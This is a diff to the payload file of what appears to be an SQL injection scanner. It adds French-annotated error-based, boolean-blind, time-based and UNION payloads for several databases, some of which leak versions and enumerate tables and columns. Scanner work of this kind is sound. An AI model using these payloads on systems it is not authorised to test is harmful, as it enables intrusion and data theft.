@@ -9,7 +9,14 @@
       {"payload": "`", "description": "Backtick — casse un identifiant MySQL", "confidence_hint": 55},
       {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- ", "description": "Double query MySQL — fuite de version via erreur 'Duplicate entry'", "confidence_hint": 75, "dbms": "MySQL", "depth": "extended"},
       {"payload": "' AND 1=CONVERT(int,@@version)-- ", "description": "Erreur de conversion MSSQL — fuite de @@version", "confidence_hint": 75, "dbms": "MSSQL", "depth": "extended"},
-      {"payload": "' AND 1=CAST((SELECT version()) AS int)-- ", "description": "Erreur de cast PostgreSQL — fuite de version()", "confidence_hint": 75, "dbms": "PostgreSQL", "depth": "extended"}
+      {"payload": "' AND 1=CAST((SELECT version()) AS int)-- ", "description": "Erreur de cast PostgreSQL — fuite de version()", "confidence_hint": 75, "dbms": "PostgreSQL", "depth": "extended"},
+      {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- ", "description": "MySQL EXTRACTVALUE() — abuse d'erreur XPath pour exfiltrer @@version", "confidence_hint": 75, "dbms": "MySQL", "depth": "extended"},
+      {"payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- ", "description": "MySQL UPDATEXML() — variante d'EXTRACTVALUE si celle-ci est filtrée", "confidence_hint": 75, "dbms": "MySQL", "depth": "extended"},
+      {"payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- ", "description": "Erreur de conversion MSSQL — énumère un nom de table via INFORMATION_SCHEMA", "confidence_hint": 70, "dbms": "MSSQL", "depth": "extended"},
+      {"payload": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- ", "description": "Erreur Oracle via CTXSYS.DRITHSX.SN — fuite de la bannière de version", "confidence_hint": 65, "dbms": "Oracle", "depth": "aggressive"},
+      {"payload": "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))-- ", "description": "Erreur Oracle via UTL_INADDR.GET_HOST_ADDRESS — alternative si CTXSYS est restreint", "confidence_hint": 60, "dbms": "Oracle", "depth": "aggressive"},
+      {"payload": "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A-- ", "description": "SQLite — force une erreur via json() invalide dans la branche ELSE", "confidence_hint": 60, "dbms": "SQLite", "depth": "extended"},
+      {"payload": "\")", "description": "Double quote + parenthèse fermante — déclenche erreur dans un contexte imbriqué", "confidence_hint": 55, "depth": "extended"}
     ],
     "boolean_blind": [
       {"payload": " AND 1=1-- ", "description": "Condition vraie", "confidence_hint": 90, "expects": "same_as_baseline"},
@@ -17,7 +24,11 @@
       {"payload": "' AND '1'='1",  "description": "String true",  "confidence_hint": 85, "expects": "same_as_baseline"},
       {"payload": "' AND '1'='2",  "description": "String false", "confidence_hint": 85, "expects": "different_from_baseline"},
       {"payload": "') AND ('1'='1", "description": "Contexte parenthèse (subquery) — condition vraie", "confidence_hint": 75, "expects": "same_as_baseline", "depth": "extended"},
-      {"payload": "') AND ('1'='2", "description": "Contexte parenthèse (subquery) — condition fausse", "confidence_hint": 75, "expects": "different_from_baseline", "depth": "extended"}
+      {"payload": "') AND ('1'='2", "description": "Contexte parenthèse (subquery) — condition fausse", "confidence_hint": 75, "expects": "different_from_baseline", "depth": "extended"},
+      {"payload": " OR 1=1-- ", "description": "OR toujours vrai — élargit le résultat (contourne un filtre WHERE)", "confidence_hint": 80, "expects": "different_from_baseline", "depth": "extended"},
+      {"payload": " OR 1=2-- ", "description": "OR toujours faux — n'élargit pas le résultat (contrôle du test précédent)", "confidence_hint": 75, "expects": "same_as_baseline", "depth": "extended"},
+      {"payload": "' AND '1'='1'#", "description": "Variante avec commentaire # (MySQL) — utile si -- est filtré ou si l'espace final est supprimé", "confidence_hint": 80, "expects": "same_as_baseline", "depth": "extended"},
+      {"payload": "' AND '1'='2'#", "description": "Variante avec commentaire # (MySQL) — condition fausse", "confidence_hint": 80, "expects": "different_from_baseline", "depth": "extended"}
     ],
     "time_based": [
       {"payload": "'; WAITFOR DELAY '0:0:5'-- ", "description": "MSSQL sleep 5s (contexte string)", "confidence_hint": 90, "dbms": "MSSQL"},
@@ -25,7 +36,12 @@
       {"payload": "'; SELECT pg_sleep(5)-- ",     "description": "PostgreSQL sleep (requête empilée)", "confidence_hint": 90, "dbms": "PostgreSQL", "depth": "aggressive"},
       {"payload": "' OR 1=(SELECT 1 FROM PG_SLEEP(5))-- ", "description": "PostgreSQL sleep (sans requête empilée)", "confidence_hint": 85, "dbms": "PostgreSQL", "depth": "aggressive"},
       {"payload": "' OR BENCHMARK(5000000,MD5('A'))-- ", "description": "MySQL alternative à SLEEP() si désactivée (charge CPU)", "confidence_hint": 80, "dbms": "MySQL", "depth": "aggressive"},
-      {"payload": "' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)-- ", "description": "Oracle sleep 5s via DBMS_PIPE.RECEIVE_MESSAGE", "confidence_hint": 80, "dbms": "Oracle", "depth": "aggressive"}
+      {"payload": "' AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)-- ", "description": "Oracle sleep 5s via DBMS_PIPE.RECEIVE_MESSAGE", "confidence_hint": 80, "dbms": "Oracle", "depth": "aggressive"},
+      {"payload": "' AND IF(1=1,SLEEP(5),0)-- ", "description": "MySQL sleep conditionnel — confirme une condition vraie (vs fausse) par le délai", "confidence_hint": 85, "dbms": "MySQL", "depth": "aggressive"},
+      {"payload": "'; IF (1=1) WAITFOR DELAY '0:0:5'-- ", "description": "MSSQL WAITFOR conditionnel — confirme une condition vraie par le délai", "confidence_hint": 85, "dbms": "MSSQL", "depth": "aggressive"},
+      {"payload": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- ", "description": "PostgreSQL sleep conditionnel — confirme une condition vraie par le délai", "confidence_hint": 85, "dbms": "PostgreSQL", "depth": "aggressive"},
+      {"payload": "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual-- ", "description": "Oracle sleep 5s inconditionnel via DBMS_PIPE — confirmation simple de l'injection", "confidence_hint": 80, "dbms": "Oracle", "depth": "aggressive"},
+      {"payload": "' AND IF(1=1,BENCHMARK(5000000,MD5('A')),0)-- ", "description": "MySQL BENCHMARK conditionnel — alternative à SLEEP() si celle-ci est désactivée", "confidence_hint": 75, "dbms": "MySQL", "depth": "aggressive"}
     ],
     "union_based": [
       {"payload": "' UNION SELECT NULL-- ",                 "description": "Test 1 col", "confidence_hint": 70},
@@ -33,7 +49,12 @@
       {"payload": "' UNION SELECT NULL,NULL,NULL-- ",       "description": "Test 3 col", "confidence_hint": 70, "depth": "extended"},
       {"payload": "' UNION SELECT NULL,NULL,NULL,NULL-- ",  "description": "Test 4 col", "confidence_hint": 65, "depth": "extended"},
       {"payload": "' ORDER BY 1-- ", "description": "Détection du nombre de colonnes via ORDER BY", "confidence_hint": 60, "depth": "extended"},
-      {"payload": "' UNION SELECT NULL,@@version-- ", "description": "Fingerprint version via UNION (MySQL/MSSQL)", "confidence_hint": 65, "depth": "extended"}
+      {"payload": "' UNION SELECT NULL,@@version-- ", "description": "Fingerprint version via UNION (MySQL/MSSQL)", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- ", "description": "Test 5 col", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ", "description": "Test 6 col", "confidence_hint": 55, "depth": "aggressive"},
+      {"payload": "' UNION SELECT NULL,table_name FROM information_schema.tables-- ", "description": "Énumère les noms de table via INFORMATION_SCHEMA (MySQL/MSSQL/PostgreSQL)", "confidence_hint": 60, "depth": "aggressive"},
+      {"payload": "' UNION SELECT CONCAT(table_name,0x3a,column_name) FROM information_schema.columns-- ", "description": "MySQL — combine table et colonne dans une seule colonne affichée via CONCAT", "confidence_hint": 60, "dbms": "MySQL", "depth": "aggressive"},
+      {"payload": "' UNION SELECT CAST(@@version AS NVARCHAR(4000)),NULL-- ", "description": "MSSQL — CAST explicite pour éviter l'erreur de type quand la colonne cible n'est pas une chaîne", "confidence_hint": 65, "dbms": "MSSQL", "depth": "aggressive"}
     ]
   }
 }
